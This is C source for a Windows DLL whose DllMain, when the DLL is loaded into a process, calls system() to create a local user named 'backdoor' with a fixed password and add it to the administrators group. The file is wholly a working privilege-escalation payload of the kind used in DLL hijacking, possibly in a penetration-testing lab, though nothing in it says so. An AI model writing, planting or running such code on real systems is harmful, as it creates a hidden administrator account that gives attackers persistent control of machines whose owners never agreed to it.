#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,
DWORD ul_reason_for_call,
LPVOID lpReserved ) 
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: 
        int i;
  	    i = system ("net user backdoor Password123! /add");
  	    i = system ("net localgroup administrators backdoor /add");
        break;
        case DLL_THREAD_ATTACH:
        break;
        case DLL_THREAD_DETACH:
        break;
        case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
